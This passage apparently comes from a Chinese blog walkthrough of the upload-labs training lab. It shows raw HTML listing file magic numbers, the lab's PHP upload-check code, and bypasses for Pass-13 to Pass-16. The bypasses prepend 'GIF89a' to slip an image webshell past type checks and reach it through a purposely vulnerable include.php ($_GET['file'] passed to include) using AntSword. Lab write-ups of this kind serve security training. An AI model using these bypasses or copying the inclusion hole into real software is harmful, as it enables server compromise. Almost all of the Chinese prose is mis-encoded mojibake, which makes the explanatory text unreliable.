class="number">42</span> <span class="number">4</span>D [å‚è€ƒï¼šbmpæ–‡ä»¶æ ¼å¼è¯¦è§£]<span class="number">42</span> <span class="number">4</span>D <span class="number">36</span> <span class="number">0</span>C <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">36</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">56</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">pythonåç¼–è¯‘æ–‡ä»¶pycçš„å¤´ï¼š<span class="number">03</span> F3 <span class="number">0</span>D <span class="number">0</span>A  ï¼ˆå®éªŒå§ï¼Œpyçš„äº¤æ˜“ä¼šç”¨åˆ°ï¼‰</span><br><span class="line">pydçš„æ–‡ä»¶å¤´ï¼š<span class="number">4</span>D <span class="number">5</span>A <span class="number">90</span> <span class="number">00</span></span><br><span class="line">ZIP <span class="title function_ invoke__">Archive</span> (zip)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">50</span> <span class="number">4</span>B <span class="number">03</span> <span class="number">04</span> asciiç éƒ¨åˆ†æ˜¯PKï¼Œå¯ä»¥ç›´æ¥æ ¹æ®PKåˆ¤æ–­æ˜¯zipæ–‡ä»¶ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯docæ–‡ä»¶</span><br><span class="line">raræ–‡ä»¶: <span class="number">52</span> <span class="number">61</span> <span class="number">72</span> <span class="number">21</span></span><br><span class="line"><span class="number">7</span>zæ–‡ä»¶å¤´ï¼š<span class="number">37</span> <span class="number">7</span>A BC AF <span class="number">27</span> <span class="number">1</span>Cï¼ˆå®éªŒå§ï¼Œæœ‰è¶£çš„æ–‡ä»¶ç”¨åˆ°äº†ï¼‰</span><br><span class="line">MS Word/<span class="title function_ invoke__">Excel</span> (xls.<span class="keyword">or</span>.doc)ï¼Œæ–‡ä»¶å¤´ï¼šD0CF11E0</span><br><span class="line"><span class="title function_ invoke__">CAD</span> (dwg)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">41433130</span></span><br><span class="line">Adobe <span class="title function_ invoke__">Photoshop</span> (psd)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">38425053</span></span><br><span class="line">Rich Text <span class="title function_ invoke__">Format</span> (rtf)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">7</span>B5C727466</span><br><span class="line"><span class="title function_ invoke__">XML</span> (xml)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">3</span>C3F786D6C</span><br><span class="line"><span class="title function_ invoke__">HTML</span> (html)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">68746</span>D6C3E</span><br><span class="line">Email [thorough only] (eml)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">44656</span>C69766572792D646174653A</span><br><span class="line">Outlook <span class="title function_ invoke__">Express</span> (dbx)ï¼Œæ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746F</span><br><span class="line"><span class="title function_ invoke__">Outlook</span> (pst)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">2142444</span>E</span><br><span class="line">MS <span class="title function_ invoke__">Access</span> (mdb)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">5374616E64617264204</span>A</span><br><span class="line"><span class="title function_ invoke__">WordPerfect</span> (wpd)ï¼Œæ–‡ä»¶å¤´ï¼šFF575043</span><br><span class="line"><span class="title function_ invoke__">Postscript</span> (eps.<span class="keyword">or</span>.ps)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">252150532</span>D41646F6265</span><br><span class="line">Adobe <span class="title function_ invoke__">Acrobat</span> (pdf)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">255044462</span>D312E</span><br><span class="line"><span class="title function_ invoke__">Quicken</span> (qdf)ï¼Œæ–‡ä»¶å¤´ï¼šAC9EBD8F</span><br><span class="line">Windows <span class="title function_ invoke__">Password</span> (pwl)ï¼Œæ–‡ä»¶å¤´ï¼šE3828596</span><br><span class="line">RAR <span class="title function_ invoke__">Archive</span> (rar)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">52617221</span></span><br><span class="line"><span class="title function_ invoke__">Wave</span> (wav)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">57415645</span></span><br><span class="line"><span class="title function_ invoke__">AVI</span> (avi)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">41564920</span></span><br><span class="line">Real <span class="title function_ invoke__">Audio</span> (ram)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">2E7261</span>FD</span><br><span class="line">Real <span class="title function_ invoke__">Media</span> (rm)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">2E524</span>D46</span><br><span class="line"><span class="title function_ invoke__">MPEG</span> (mpg)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">000001</span>BA</span><br><span class="line"><span class="title function_ invoke__">MPEG</span> (mpg)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">000001</span>B3</span><br><span class="line"><span class="title function_ invoke__">Quicktime</span> (mov)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">6</span>D6F6F76</span><br><span class="line">Windows <span class="title function_ invoke__">Media</span> (asf)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">3026</span>B2758E66CF11</span><br><span class="line"><span class="title function_ invoke__">MIDI</span> (mid)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">4</span>D546864</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå¯ä»¥åœ¨æ–‡ä»¶å‰æ·»åŠ <code>GIF89a</code>æ¥è¿·æƒ‘æ–‡ä»¶æ£€æµ‹<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673778087346-92bc1307-babe-4ad4-b1c5-85473c31f677.png" alt="image.png"><br>æ·»åŠ ä¹‹åä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯è¿™æ—¶å€™æ–‡ä»¶åç¼€æ˜¯<code>.gif</code>æ ¼å¼ï¼Œè¿™é“é¢˜è¦æ±‚çš„æ˜¯ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå› æ­¤åˆ°è¿™é‡Œå³å¯ï¼Œæˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥ä½¿ç”¨ã€‚</p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>æˆ‘ä»¬åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ª<code>include.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åä¿å­˜åˆ°<code>upload-labs</code>çš„ç›®å½•ä¸‹å³å¯ï¼ˆä¸uploadæ–‡ä»¶å¤¹åŒçº§ï¼‰ï¼Œä¿å­˜ä¹‹åï¼Œç”¨antswordè¿æ¥<br><code>http://ä½ çš„ip/upload-labs/include.php?file=upload/æ–‡ä»¶åç§°</code>ï¼Œå¦‚æœå¯ä»¥è¿æ¥åˆ™è¯´æ˜å›¾ç‰‡é©¬ä¸Šä¼ æˆåŠŸã€‚ï¼ˆæ³¨æ„ï¼Œè¿™é“é¢˜ä¸Šä¼ çš„å›¾ç‰‡é©¬ä¼šæ”¹åå­—ï¼Œä¿®æ”¹çš„åå­—åœ¨responseä¼ å›æ—¶ä¼šæ˜¾ç¤ºï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673782519464-3fcd10b2-4cc6-4d71-9e53-2326825163ca.png" alt="image.png"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-12"><a href="#è§£æ³•-12" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p><code>getimagesize()</code> å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› <code>FALSE</code> å¹¶äº§ç”Ÿä¸€æ¡ <code>E_WARNING</code> çº§çš„é”™è¯¯ä¿¡æ¯ã€‚<br>ä½†æ˜¯ä¹Ÿå¯ä»¥ä½¿ç”¨ä¿®æ”¹æ–‡ä»¶å¤´æ ‡å‡†ç¼–ç ç»•è¿‡ï¼Œæ‰€ä»¥ç”¨å’ŒPass-13ç›¸åŒæ­¥éª¤å³å¯ç»•è¿‡ã€‚</p><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-13"><a href="#è§£æ³•-13" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p><code>$image_type = exif_imagetype($filename);</code><br><code>exif_imagetype()</code> è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚<br>å¯ä»¥ä½¿ç”¨å’Œå‰ä¸¤é¢˜ç›¸åŒçš„æ“ä½œæ¥ç»•è¿‡ã€‚</p><h2 id="æ³¨æ„-2"><a href="#æ³¨æ„-2" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>å¦‚æœæƒ³è¦è°ƒç”¨<code>exif_imagetype()</code>è¿™ä¸ªå‡½æ•°éœ€è¦ç³»ç»Ÿé…ç½®æ–‡ä»¶å¼€å¯php_exifæ¨¡å—ï¼Œå³<code>php-ini</code>æ–‡ä»¶ä¸­æœç´¢<code>php_exif</code>å°†è¡Œå‰çš„åˆ†å·åˆ é™¤ï¼ˆåˆ†å·åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æ˜¯æ³¨é‡Šçš„å«ä¹‰ï¼‰ã€‚</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=<span class="variable">$UPLOAD_ADDR</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span 